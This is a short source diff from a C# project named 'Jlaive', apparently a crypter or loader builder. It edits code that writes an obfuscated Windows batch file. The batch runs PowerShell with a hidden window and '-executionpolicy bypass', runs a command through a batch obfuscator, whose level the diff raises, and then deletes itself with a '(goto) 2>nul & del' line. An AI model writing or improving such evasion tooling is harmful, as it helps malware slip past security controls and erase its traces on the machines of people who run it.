@@ -21,11 +21,9 @@ namespace Jlaive
             output.AppendLine(obfuscated.Item2);
 
             string commandstart = $"-noprofile {(hidden ? "-windowstyle hidden" : string.Empty)} -executionpolicy bypass -command ";
-            obfuscated = Obfuscator.GenCodeBat(commandstart, rng, 2);
+            obfuscated = Obfuscator.GenCodeBat(commandstart + command, rng, 3);
             output.AppendLine(obfuscated.Item1);
-            (string, string) obfuscated2 = Obfuscator.GenCodeBat(command, rng, 2);
-            output.AppendLine(obfuscated2.Item1);
-            output.AppendLine("\"%~nx0.exe\" " + obfuscated.Item2 + obfuscated2.Item2);
+            output.AppendLine("\"%~nx0.exe\" " + obfuscated.Item2);
 
             if (selfdelete) output.AppendLine("(goto) 2>nul & del \"%~f0\"");
             output.AppendLine("exit /b");
